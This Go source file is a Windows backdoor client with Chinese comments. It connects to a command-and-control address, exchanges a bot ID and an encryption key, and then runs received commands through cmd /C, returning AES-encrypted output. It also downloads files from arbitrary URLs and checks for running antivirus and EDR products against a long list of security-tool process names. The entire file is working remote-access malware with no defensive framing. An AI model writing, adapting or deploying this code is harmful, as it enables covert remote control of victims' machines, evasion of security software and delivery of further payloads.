package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"math/big"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	chanQuit = make(chan bool, 0)
	conn     net.Conn
)

const buf = 1024

type ulong int32
type ulong_ptr uintptr
type PROCESSENTRY32 struct {
	dwSize              ulong
	cntUsage            ulong
	th32ProcessID       ulong
	th32DefaultHeapID   ulong_ptr
	th32ModuleID        ulong
	cntThreads          ulong
	th32ParentProcessID ulong
	pcPriClassBase      ulong
	dwFlags             ulong
	szExeFile           [260]byte
}

//TODO:报错
func CHandleError(err error, why string) {
	if err != nil {
		fmt.Println(why, err)
	}
}

//TODO:随机数生成
func genNumStr(len int) string {

	var container string
	var str = "1234567890"
	b := bytes.NewBufferString(str)
	length := b.Len()
	bigInt := big.NewInt(int64(length))
	for i := 0; i < len; i++ {
		randomInt, _ := rand.Int(rand.Reader, bigInt)
		container += string(str[randomInt.Int64()])
	}
	return container
}

//TODO:加密算法
func encryptDog(encrypt bool, key []byte, message string) (result string) {
	/*
		加密函数是直接copy来的。
		encypt为true加密，false解密
		key是动态密钥
		message是内容
	*/
	if encrypt {
		plainText := []byte(message)
		block, _ := aes.NewCipher(key)
		cipherText := make([]byte, aes.BlockSize+len(plainText))
		iv := cipherText[:aes.BlockSize]
		stream := cipher.NewCFBEncrypter(block, iv)
		stream.XORKeyStream(cipherText[aes.BlockSize:], plainText)
		result = base64.URLEncoding.EncodeToString(cipherText)
	} else {
		cipherText, _ := base64.URLEncoding.DecodeString(message)
		block, _ := aes.NewCipher(key)
		iv := cipherText[:aes.BlockSize]
		cipherText = cipherText[aes.BlockSize:]
		stream := cipher.NewCFBDecrypter(block, iv)
		stream.XORKeyStream(cipherText, cipherText)
		result = string(cipherText)
	}

	return
}

//TODO:检查杀毒软件的函数
func checkAV() string {

	avs := ""

	avList := []string{"usysdiag.exe", "HRSword.exe", "HipsMain.exe", "Tanium.exe", "Tanium.exe", "360RP.exe", "360SD.exe", "360Safe.exe", "360leakfixer.exe", "360rp.exe", "360safe.exe", "360sd.exe", "360tray.exe", "AAWTray.exe", "ACAAS.exe", "ACAEGMgr.exe", "ACAIS.exe", "AClntUsr.EXE", "ALERT.EXE", "ALERTSVC.EXE", "ALMon.exe", "ALUNotify.exe", "ALUpdate.exe", "ALsvc.exe", "AVENGINE.exe", "AVGCHSVX.EXE", "AVGCSRVX.EXE", "AVGIDSAgent.exe", "AVGIDSMonitor.exe", "AVGIDSUI.exe", "AVGIDSWatcher.exe", "AVGNSX.EXE", "AVKProxy.exe", "AVKService.exe", "AVKTray.exe", "AVKWCtl.exe", "AVP.EXE", "AVP.exe", "AVPDTAgt.exe", "AcctMgr.exe", "Ad-Aware.exe", "Ad-Aware2007.exe", "AddressExport.exe", "AdminServer.exe", "Administrator.exe", "AeXAgentUIHost.exe", "AeXNSAgent.exe", "AeXNSRcvSvc.exe", "AlertSvc.exe", "AlogServ.exe", "AluSchedulerSvc.exe", "AnVir.exe", "AppSvc32.exe", "AtrsHost.exe", "Auth8021x.exe", "AvastSvc.exe", "AvastUI.exe", "Avconsol.exe", "AvpM.exe", "Avsynmgr.exe", "Avtask.exe", "BLACKD.exe", "BWMeterConSvc.exe", "CAAntiSpyware.exe", "CALogDump.exe", "CAPPActiveProtection.exe", "CAPPActiveProtection.exe", "CB.exe", "CCAP.EXE", "CCenter.exe", "CClaw.exe", "CLPS.exe", "CLPSLA.exe", "CLPSLS.exe", "CNTAoSMgr.exe", "CPntSrv.exe", "CTDataLoad.exe", "CertificationManagerServiceNT.exe", "ClShield.exe", "ClamTray.exe", "ClamWin.exe", "Console.exe", "CylanceUI.exe", "DAO_Log.exe", "DLService.exe", "DLTray.EXE", "DLTray.exe", "DRWAGNTD.EXE", "DRWAGNUI.EXE", "DRWEB32W.EXE", "DRWEBSCD.EXE", "DRWEBUPW.EXE", "DRWINST.EXE", "DSMain.exe", "DWHWizrd.exe", "DefWatch.exe", "DolphinCharge.exe", "EHttpSrv.exe", "EMET_Agent.exe", "EMET_Service.exe", "EMLPROUI.exe", "EMLPROXY.exe", "EMLibUpdateAgentNT.exe", "ETConsole3.exe", "ETCorrel.exe", "ETLogAnalyzer.exe", "ETReporter.exe", "ETRssFeeds.exe", "EUQMonitor.exe", "EndPointSecurity.exe", "EngineServer.exe", "EntityMain.exe", "EtScheduler.exe", "EtwControlPanel.exe", "EventParser.exe", "FAMEH32.exe", "FCDBLog.exe", "FCH32.exe", "FPAVServer.exe", "FProtTray.exe", "FSCUIF.exe", "FSHDLL32.exe", "FSM32.exe", "FSMA32.exe", "FSMB32.exe", "FWCfg.exe", "FireSvc.exe", "FireTray.exe", "FirewallGUI.exe", "ForceField.exe", "FortiProxy.exe", "FortiTray.exe", "FortiWF.exe", "FrameworkService.exe", "FreeProxy.exe", "GDFirewallTray.exe", "GDFwSvc.exe", "HWAPI.exe", "ISNTSysMonitor.exe", "ISSVC.exe", "ISWMGR.exe", "ITMRTSVC.exe", "ITMRT_SupportDiagnostics.exe", "ITMRT_TRACE.exe", "IcePack.exe", "IdsInst.exe", "InoNmSrv.exe", "InoRT.exe", "InoRpc.exe", "InoTask.exe", "InoWeb.exe", "IsntSmtp.exe", "KABackReport.exe", "KANMCMain.exe", "KAVFS.EXE", "KAVStart.exe", "KLNAGENT.EXE", "KMailMon.exe", "KNUpdateMain.exe", "KPFWSvc.exe", "KSWebShield.exe", "KVMonXP.exe", "KVMonXP_2.exe", "KVSrvXP.exe", "KWSProd.exe", "KWatch.exe", "KavAdapterExe.exe", "KeyPass.exe", "KvXP.exe", "LUALL.EXE", "LWDMServer.exe", "LockApp.exe", "LockAppHost.exe", "LogGetor.exe", "MCSHIELD.EXE", "MCUI32.exe", "MSASCui.exe", "ManagementAgentNT.exe", "McAfeeDataBackup.exe", "McEPOC.exe", "McEPOCfg.exe", "McNASvc.exe", "McProxy.exe", "McScript_InUse.exe", "McWCE.exe", "McWCECfg.exe", "Mcshield.exe", "Mctray.exe", "MgntSvc.exe", "MpCmdRun.exe", "MpfAgent.exe", "MpfSrv.exe", "MsMpEng.exe", "NAIlgpip.exe", "NAVAPSVC.EXE", "NAVAPW32.EXE", "NCDaemon.exe", "NIP.exe", "NJeeves.exe", "NLClient.exe", "NMAGENT.EXE", "NOD32view.exe", "NPFMSG.exe", "NPROTECT.EXE", "NRMENCTB.exe", "NSMdtr.exe", "NTRtScan.exe", "NVCOAS.exe", "NVCSched.exe", "NavShcom.exe", "Navapsvc.exe", "NaveCtrl.exe", "NaveLog.exe", "NaveSP.exe", "Navw32.exe", "Navwnt.exe", "Nip.exe", "Njeeves.exe", "Npfmsg2.exe", "Npfsvice.exe", "NscTop.exe", "Nvcoas.exe", "Nvcsched.exe", "Nymse.exe", "OLFSNT40.EXE", "OMSLogManager.exe", "ONLINENT.exe", "ONLNSVC.exe", "OfcPfwSvc.exe", "PASystemTray.exe", "PAVFNSVR.exe", "PAVSRV51.exe", "PNmSrv.exe", "POPROXY.EXE", "POProxy.exe", "PPClean.exe", "PPCtlPriv.exe", "PQIBrowser.exe", "PSHost.exe", "PSIMSVC.EXE", "PXEMTFTP.exe", "PadFSvr.exe", "Pagent.exe", "Pagentwd.exe", "PavBckPT.exe", "PavFnSvr.exe", "PavPrSrv.exe", "PavProt.exe", "PavReport.exe", "Pavkre.exe", "PcCtlCom.exe", "PcScnSrv.exe", "PccNTMon.exe", "PccNTUpd.exe", "PpPpWallRun.exe", "PrintDevice.exe", "ProUtil.exe", "PsCtrlS.exe", "PsImSvc.exe", "PwdFiltHelp.exe", "Qoeloader.exe", "RAVMOND.exe", "RAVXP.exe", "RNReport.exe", "RPCServ.exe", "RSSensor.exe", "RTVscan.exe", "RapApp.exe", "Rav.exe", "RavAlert.exe", "RavMon.exe", "RavMonD.exe", "RavService.exe", "RavStub.exe", "RavTask.exe", "RavTray.exe", "RavUpdate.exe", "RavXP.exe", "RealMon.exe", "Realmon.exe", "RedirSvc.exe", "RegMech.exe", "ReporterSvc.exe", "RouterNT.exe", "Rtvscan.exe", "SAFeService.exe", "SAService.exe", "SAVAdminService.exe", "SAVFMSESp.exe", "SAVMain.exe", "SAVScan.exe", "SCANMSG.exe", "SCANWSCS.exe", "SCFManager.exe", "SCFService.exe", "SCFTray.exe", "SDTrayApp.exe", "SEVINST.EXE", "SMEX_ActiveUpdate.exe", "SMEX_Master.exe", "SMEX_RemoteConf.exe", "SMEX_SystemWatch.exe", "SMSECtrl.exe", "SMSELog.exe", "SMSESJM.exe", "SMSESp.exe", "SMSESrv.exe", "SMSETask.exe", "SMSEUI.exe", "SNAC.EXE", "SNAC.exe", "SNDMon.exe", "SNDSrvc.exe", "SPBBCSvc.exe", "SPIDERML.EXE", "SPIDERNT.EXE", "SSM.exe", "SSScheduler.exe", "SVCharge.exe", "SVDealer.exe", "SVFrame.exe", "SVTray.exe", "SWNETSUP.EXE", "SavRoam.exe", "SavService.exe", "SavUI.exe", "ScanMailOutLook.exe", "SeAnalyzerTool.exe", "SemSvc.exe", "SescLU.exe", "SetupGUIMngr.exe", "SiteAdv.exe", "Smc.exe", "SmcGui.exe", "SnHwSrv.exe", "SnICheckAdm.exe", "SnIcon.exe", "SnSrv.exe", "SnicheckSrv.exe", "SpIDerAgent.exe", "SpntSvc.exe", "SpyEmergency.exe", "SpyEmergencySrv.exe", "StOPP.exe", "StWatchDog.exe", "SymCorpUI.exe", "SymSPort.exe", "TBMon.exe", "TFGui.exe", "TFService.exe", "TFTray.exe", "TFun.exe", "TIASPN~1.EXE", "TSAnSrf.exe", "TSAtiSy.exe", "TScutyNT.exe", "TSmpNT.exe", "TmListen.exe", "TmPfw.exe", "Tmntsrv.exe", "Traflnsp.exe", "TrapTrackerMgr.exe", "UPSCHD.exe", "UcService.exe", "UdaterUI.exe", "UmxAgent.exe", "UmxCfg.exe", "UmxFwHlp.exe", "UmxPol.exe", "Up2date.exe", "UpdaterUI.exe", "UrlLstCk.exe", "UserActivity.exe", "UserAnalysis.exe", "UsrPrmpt.exe", "V3Medic.exe", "V3Svc.exe", "VPC32.exe", "VPDN_LU.exe", "VPTray.exe", "VSStat.exe", "VsStat.exe", "VsTskMgr.exe", "WEBPROXY.EXE", "WFXCTL32.EXE", "WFXMOD32.EXE", "WFXSNT40.EXE", "WebProxy.exe", "WebScanX.exe", "WinRoute.exe", "WrSpySetup.exe", "ZLH.exe", "Zanda.exe", "ZhuDongFangYu.exe", "Zlh.exe", "_avp32.exe", "_avpcc.exe", "_avpm.exe", "aAvgApi.exe", "aawservice.exe", "acaif.exe", "acctmgr.exe", "ackwin32.exe", "aclient.exe", "adaware.exe", "advxdwin.exe", "aexnsagent.exe", "aexsvc.exe", "aexswdusr.exe", "aflogvw.exe", "afwServ.exe", "agentsvr.exe", "agentw.exe", "ahnrpt.exe", "ahnsd.exe", "ahnsdsv.exe", "alertsvc.exe", "alevir.exe", "alogserv.exe", "alsvc.exe", "alunotify.exe", "aluschedulersvc.exe", "amon9x.exe", "amswmagt.exe", "anti-trojan.exe", "antiarp.exe", "antivirus.exe", "ants.exe", "aphost.exe", "apimonitor.exe", "aplica32.exe", "aps.exe", "apvxdwin.exe", "arr.exe", "ashAvast.exe", "ashBug.exe", "ashChest.exe", "ashCmd.exe", "ashDisp.exe", "ashEnhcd.exe", "ashLogV.exe", "ashMaiSv.exe", "ashPopWz.exe", "ashQuick.exe", "ashServ.exe", "ashSimp2.exe", "ashSimpl.exe", "ashSkPcc.exe", "ashSkPck.exe", "ashUpd.exe", "ashWebSv.exe", "ashdisp.exe", "ashmaisv.exe", "ashserv.exe", "ashwebsv.exe", "asupport.exe", "aswDisp.exe", "aswRegSvr.exe", "aswServ.exe", "aswUpdSv.exe", "aswUpdsv.exe", "aswWebSv.exe", "aswupdsv.exe", "atcon.exe", "atguard.exe", "atro55en.exe", "atupdater.exe", "atwatch.exe", "atwsctsk.exe", "au.exe", "aupdate.exe", "aupdrun.exe", "aus.exe", "auto-protect.nav80try.exe", "autodown.exe", "autotrace.exe", "autoup.exe", "autoupdate.exe", "avEngine.exe", "avadmin.exe", "avcenter.exe", "avconfig.exe", "avconsol.exe", "ave32.exe", "avengine.exe", "avesvc.exe", "avfwsvc.exe", "avgam.exe", "avgamsvr.exe", "avgas.exe", "avgcc.exe", "avgcc32.exe", "avgcsrvx.exe", "avgctrl.exe", "avgdiag.exe", "avgemc.exe", "avgfws8.exe", "avgfws9.exe", "avgfwsrv.exe", "avginet.exe", "avgmsvr.exe", "avgnsx.exe", "avgnt.exe", "avgregcl.exe", "avgrssvc.exe", "avgrsx.exe", "avgscanx.exe", "avgserv.exe", "avgserv9.exe", "avgsystx.exe", "avgtray.exe", "avguard.exe", "avgui.exe", "avgupd.exe", "avgupdln.exe", "avgupsvc.exe", "avgvv.exe", "avgw.exe", "avgwb.exe", "avgwdsvc.exe", "avgwizfw.exe", "avkpop.exe", "avkserv.exe", "avkservice.exe", "avkwctl9.exe", "avltmain.exe", "avmailc.exe", "avmcdlg.exe", "avnotify.exe", "avnt.exe", "avp.exe", "avp32.exe", "avpcc.exe", "avpdos32.exe", "avpexec.exe", "avpm.exe", "avpncc.exe", "avps.exe", "avptc32.exe", "avpupd.exe", "avscan.exe", "avsched32.exe", "avserver.exe", "avshadow.exe", "avsynmgr.exe", "avwebgrd.exe", "avwin.exe", "avwin95.exe", "avwinnt.exe", "avwupd.exe", "avwupd32.exe", "avwupsrv.exe", "avxmonitor9x.exe", "avxmonitornt.exe", "avxquar.exe", "backweb.exe", "bargains.exe", "basfipm.exe", "bd_professional.exe", "bdagent.exe", "bdc.exe", "bdlite.exe", "bdmcon.exe", "bdss.exe", "bdsubmit.exe", "beagle.exe", "belt.exe", "bidef.exe", "bidserver.exe", "bipcp.exe", "bipcpevalsetup.exe", "bisp.exe", "blackd.exe", "blackice.exe", "blink.exe", "blss.exe", "bmrt.exe", "bootconf.exe", "bootwarn.exe", "borg2.exe", "bpc.exe", "bpk.exe", "brasil.exe", "bs120.exe", "bundle.exe", "bvt.exe", "bwgo0000.exe", "ca.exe", "caav.exe", "caavcmdscan.exe", "caavguiscan.exe", "caf.exe", "cafw.exe", "caissdt.exe", "capfaem.exe", "capfasem.exe", "capfsem.exe", "capmuamagt.exe", "casc.exe", "casecuritycenter.exe", "caunst.exe", "cavrep.exe", "cavrid.exe", "cavscan.exe", "cavtray.exe", "ccApp.exe", "ccEvtMgr.exe", "ccLgView.exe", "ccProxy.exe", "ccSetMgr.exe", "ccSetmgr.exe", "ccSvcHst.exe", "ccap.exe", "ccapp.exe", "ccevtmgr.exe", "cclaw.exe", "ccnfagent.exe", "ccprovsp.exe", "ccproxy.exe", "ccpxysvc.exe", "ccschedulersvc.exe", "ccsetmgr.exe", "ccsmagtd.exe", "ccsvchst.exe", "ccsystemreport.exe", "cctray.exe", "ccupdate.exe", "cdp.exe", "cfd.exe", "cfftplugin.exe", "cfgwiz.exe", "cfiadmin.exe", "cfiaudit.exe", "cfinet.exe", "cfinet32.exe", "cfnotsrvd.exe", "cfp.exe", "cfpconfg.exe", "cfpconfig.exe", "cfplogvw.exe", "cfpsbmit.exe", "cfpupdat.exe", "cfsmsmd.exe", "checkup.exe", "cka.exe", "clamscan.exe", "claw95.exe", "claw95cf.exe", "clean.exe", "cleaner.exe", "cleaner3.exe", "cleanpc.exe", "cleanup.exe", "click.exe", "cmdagent.exe", "cmdinstall.exe", "cmesys.exe", "cmgrdian.exe", "cmon016.exe", "comHost.exe", "connectionmonitor.exe", "control_panel.exe", "cpd.exe", "cpdclnt.exe", "cpf.exe", "cpf9x206.exe", "cpfnt206.exe", "crashrep.exe", "csacontrol.exe", "csinject.exe", "csinsm32.exe", "csinsmnt.exe", "csrss_tc.exe", "ctrl.exe", "cv.exe", "cwnb181.exe", "cwntdwmo.exe", "cz.exe", "datemanager.exe", "dbserv.exe", "dbsrv9.exe", "dcomx.exe", "defalert.exe", "defscangui.exe", "defwatch.exe", "deloeminfs.exe", "deputy.exe", "diskmon.exe", "divx.exe", "djsnetcn.exe", "dllcache.exe", "dllreg.exe", "doors.exe", "doscan.exe", "dpf.exe", "dpfsetup.exe", "dpps2.exe", "drwagntd.exe", "drwatson.exe", "drweb.exe", "drweb32.exe", "drweb32w.exe", "drweb386.exe", "drwebcgp.exe", "drwebcom.exe", "drwebdc.exe", "drwebmng.exe", "drwebscd.exe", "drwebupw.exe", "drwebwcl.exe", "drwebwin.exe", "drwupgrade.exe", "dsmain.exe", "dssagent.exe", "dvp95.exe", "dvp95_0.exe", "dwengine.exe", "dwhwizrd.exe", "dwwin.exe", "ecengine.exe", "edisk.exe", "efpeadm.exe", "egui.exe", "ekrn.exe", "elogsvc.exe", "emet_agent.exe", "emet_service.exe", "emsw.exe", "engineserver.exe", "ent.exe", "era.exe", "esafe.exe", "escanhnt.exe", "escanv95.exe", "esecagntservice.exe", "esecservice.exe", "esmagent.exe", "espwatch.exe", "etagent.exe", "ethereal.exe", "etrustcipe.exe", "evpn.exe", "evtProcessEcFile.exe", "evtarmgr.exe", "evtmgr.exe", "exantivirus-cnet.exe", "exe.avxw.exe", "execstat.exe", "expert.exe", "explore.exe", "f-agnt95.exe", "f-prot.exe", "f-prot95.exe", "f-stopw.exe", "fameh32.exe", "fast.exe", "fch32.exe", "fih32.exe", "findviru.exe", "firesvc.exe", "firetray.exe", "firewall.exe", "fmon.exe", "fnrb32.exe", "fortifw.exe", "fp-win.exe", "fp-win_trial.exe", "fprot.exe", "frameworkservice.exe", "frminst.exe", "frw.exe", "fsaa.exe", "fsaua.exe", "fsav.exe", "fsav32.exe", "fsav530stbyb.exe", "fsav530wtbyb.exe", "fsav95.exe", "fsavgui.exe", "fscuif.exe", "fsdfwd.exe", "fsgk32.exe", "fsgk32st.exe", "fsguidll.exe", "fsguiexe.exe", "fshdll32.exe", "fsm32.exe", "fsma32.exe", "fsmb32.exe", "fsorsp.exe", "fspc.exe", "fspex.exe", "fsqh.exe", "fssm32.exe", "fwinst.exe", "gator.exe", "gbmenu.exe", "gbpoll.exe", "gcascleaner.exe", "gcasdtserv.exe", "gcasinstallhelper.exe", "gcasnotice.exe", "gcasserv.exe", "gcasservalert.exe", "gcasswupdater.exe", "generics.exe", "gfireporterservice.exe", "ghost_2.exe", "ghosttray.exe", "giantantispywaremain.exe", "giantantispywareupdater.exe", "gmt.exe", "guard.exe", "guarddog.exe", "guardgui.exe", "hacktracersetup.exe", "hbinst.exe", "hbsrv.exe", "hipsvc.exe", "hotactio.exe", "hotpatch.exe", "htlog.exe", "htpatch.exe", "hwpe.exe", "hxdl.exe", "hxiul.exe", "iamapp.exe", "iamserv.exe", "iamstats.exe", "ibmasn.exe", "ibmavsp.exe", "icepack.exe", "icload95.exe", "icloadnt.exe", "icmon.exe", "icsupp95.exe", "icsuppnt.exe", "idle.exe", "iedll.exe", "iedriver.exe", "iface.exe", "ifw2000.exe", "igateway.exe", "inetlnfo.exe", "infus.exe", "infwin.exe", "inicio.exe", "init.exe", "inonmsrv.exe", "inorpc.exe", "inort.exe", "inotask.exe", "intdel.exe", "intren.exe", "iomon98.exe", "isPwdSvc.exe", "isUAC.exe", "isafe.exe", "isafinst.exe", "issvc.exe", "istsvc.exe", "jammer.exe", "jdbgmrg.exe", "jedi.exe", "kaccore.exe", "kansgui.exe", "kansvr.exe", "kastray.exe", "kav.exe", "kav32.exe", "kavfs.exe", "kavfsgt.exe", "kavfsrcn.exe", "kavfsscs.exe", "kavfswp.exe", "kavisarv.exe", "kavlite40eng.exe", "kavlotsingleton.exe", "kavmm.exe", "kavpers40eng.exe", "kavpf.exe", "kavshell.exe", "kavss.exe", "kavstart.exe", "kavsvc.exe", "kavtray.exe", "kazza.exe", "keenvalue.exe", "kerio-pf-213-en-win.exe", "kerio-wrl-421-en-win.exe", "kerio-wrp-421-en-win.exe", "kernel32.exe", "killprocesssetup161.exe", "kis.exe", "kislive.exe", "kissvc.exe", "klnacserver.exe", "klnagent.exe", "klserver.exe", "klswd.exe", "klwtblfs.exe", "kmailmon.exe", "knownsvr.exe", "kpf4gui.exe", "kpf4ss.exe", "kpfw32.exe", "kpfwsvc.exe", "krbcc32s.exe", "kvdetech.exe", "kvolself.exe", "kvsrvxp.exe", "kvsrvxp_1.exe", "kwatch.exe", "kwsprod.exe", "kxeserv.exe", "launcher.exe", "ldnetmon.exe", "ldpro.exe", "ldpromenu.exe", "ldscan.exe", "leventmgr.exe", "livesrv.exe", "lmon.exe", "lnetinfo.exe", "loader.exe", "localnet.exe", "lockdown.exe", "lockdown2000.exe", "log_qtine.exe", "lookout.exe", "lordpe.exe", "lsetup.exe", "luall.exe", "luau.exe", "lucallbackproxy.exe", "lucoms.exe", "lucomserver.exe", "lucoms~1.exe", "luinit.exe", "luspt.exe", "makereport.exe", "mantispm.exe", "mapisvc32.exe", "masalert.exe", "massrv.exe", "mcafeefire.exe", "mcagent.exe", "mcappins.exe", "mcconsol.exe", "mcdash.exe", "mcdetect.exe", "mcepoc.exe", "mcepocfg.exe", "mcinfo.exe", "mcmnhdlr.exe", "mcmscsvc.exe", "mcods.exe", "mcpalmcfg.exe", "mcpromgr.exe", "mcregwiz.exe", "mcscript.exe", "mcscript_inuse.exe", "mcshell.exe", "mcshield.exe", "mcshld9x.exe", "mcsysmon.exe", "mctool.exe", "mctray.exe", "mctskshd.exe", "mcuimgr.exe", "mcupdate.exe", "mcupdmgr.exe", "mcvsftsn.exe", "mcvsrte.exe", "mcvsshld.exe", "mcwce.exe", "mcwcecfg.exe", "md.exe", "mfeann.exe", "mfevtps.exe", "mfin32.exe", "mfw2en.exe", "mfweng3.02d30.exe", "mgavrtcl.exe", "mgavrte.exe", "mghtml.exe", "mgui.exe", "minilog.exe", "mmod.exe", "monitor.exe", "monsvcnt.exe", "monsysnt.exe", "moolive.exe", "mostat.exe", "mpcmdrun.exe", "mpf.exe", "mpfagent.exe", "mpfconsole.exe", "mpfservice.exe", "mpftray.exe", "mps.exe", "mpsevh.exe", "mpsvc.exe", "mrf.exe", "mrflux.exe", "msapp.exe", "msascui.exe", "msbb.exe", "msblast.exe", "mscache.exe", "msccn32.exe", "mscifapp.exe", "mscman.exe", "msconfig.exe", "msdm.exe", "msdos.exe", "msiexec16.exe", "mskagent.exe", "mskdetct.exe", "msksrver.exe", "msksrvr.exe", "mslaugh.exe", "msmgt.exe", "msmpeng.exe", "msmsgri32.exe", "msscli.exe", "msseces.exe", "mssmmc32.exe", "msssrv.exe", "mssys.exe", "msvxd.exe", "mu0311ad.exe", "mwatch.exe", "myagttry.exe", "n32scanw.exe", "nSMDemf.exe", "nSMDmon.exe", "nSMDreal.exe", "nSMDsch.exe", "naPrdMgr.exe", "nav.exe", "navap.navapsvc.exe", "navapsvc.exe", "navapw32.exe", "navdx.exe", "navlu32.exe", "navnt.exe", "navstub.exe", "navw32.exe", "navwnt.exe", "nc2000.exe", "ncinst4.exe"}

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	CreateToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
	pHandle, _, _ := CreateToolhelp32Snapshot.Call(uintptr(0x2), uintptr(0x0))
	Process32Next := kernel32.NewProc("Process32Next")
	for {
		var proc PROCESSENTRY32
		proc.dwSize = ulong(unsafe.Sizeof(proc))
		if rt, _, _ := Process32Next.Call(uintptr(pHandle), uintptr(unsafe.Pointer(&proc))); int(rt) == 1 {

			for av := range avList {
				//fmt.Println(strings.ToLower(string(proc.szExeFile[0:])))
				if strings.Compare(strings.ToLower(avList[av]), strings.ToLower(string(strings.Split(string(proc.szExeFile[0:]), ".")[0])+".exe")) == 0 {
					avs = avs + string(strings.Split(string(proc.szExeFile[0:]), ".")[0]) + ".exe\n"
				}
			}
		} else {
			break
		}
	}
	CloseHandle := kernel32.NewProc("CloseHandle")
	_, _, _ = CloseHandle.Call(pHandle)
	return avs
}

//TODO:文件下载
func download(command string) error {

	command = strings.ReplaceAll(strings.ReplaceAll(command, "\r", ""), "\n", "")
	var URL = ""
	var fileName = ""
	URL = strings.Split(strings.ReplaceAll(command, "download ", ""), " ")[0]
	fileName = strings.Split(strings.ReplaceAll(command, "download ", ""), " ")[1]

	r, err := http.Get(URL)
	if err != nil {
		return err
	}
	defer r.Body.Close()
	data, err := ioutil.ReadAll(r.Body)
	if err != nil {
		return err
	}
	err = ioutil.WriteFile(fileName, data, 0644)
	if err != nil {
		return err
	}
	return nil
}

//TODO:shell相关流程
func goShell(conn net.Conn, keyStr string) bool {

	key := []byte(keyStr)
	var cmd_buf []byte
	cmd_buf = make([]byte, buf)
	for {
		receivedBytes, err := conn.Read(cmd_buf[0:])
		if err != nil {
			break
		}
		enc_command := string(cmd_buf[0:receivedBytes])
		byte_command := encryptDog(false, key, enc_command)
		command := string(byte_command)
		if strings.Index(command, "stop") == 0 {
			conn.Close()
			os.Exit(0)
		} else if strings.Index(command, "cd") == 0 {
			dir := strings.TrimSuffix(command[3:], "\r\n")
			os.Chdir(string(dir))
		} else if strings.HasPrefix(command, "checkav") {

			enc_cmdout := encryptDog(true, key, string(checkAV()))
			output := string(enc_cmdout) + "\n"
			conn.Write([]byte(output))

		} else if strings.HasPrefix(command, "download") {

			go download(command)
			enc_cmdout := encryptDog(true, key, "downloading...")
			output := string(enc_cmdout) + "\n"
			conn.Write([]byte(output))

		} else {
			shell_arg := []string{"/C", command}
			execcmd := exec.Command("cmd", shell_arg...)
			cmdout, _ := execcmd.Output()

			enc_cmdout := encryptDog(true, key, string(cmdout))
			output := string(enc_cmdout) + "\n"
			conn.Write([]byte(output))
		}
	}
	return false
}

//TODO:入口
func main() {

	var (
		botNum  = ""
		ip_port = "127.0.0.1:55555"
	)

	if len(os.Args) > 1 {
		fmt.Println(os.Args[1])
		ip_port = string(os.Args[1])
	}

	buffer := make([]byte, 1024)

	botNum = genNumStr(4)

	for {
		//连接c2,发送握手包
		conn, err := net.Dial("tcp", ip_port)

		if err == nil {
			conn.Write([]byte(botNum))
			n, err := conn.Read(buffer)
			if err != nil {
				time.Sleep(5 * time.Second)
			} else {
				if n > 0 {
					//获取密钥
					keyStr := string(buffer[:n])
					//fmt.Println(keyStr)
					if len(keyStr) > 0 {
						//进入shell执行流程
						goShell(conn, keyStr)
					} else {
						time.Sleep(5 * time.Second)
					}
				}
			}
		} else {
			time.Sleep(10 * time.Second)
		}
	}

	//设置优雅退出逻辑
	<-chanQuit
}
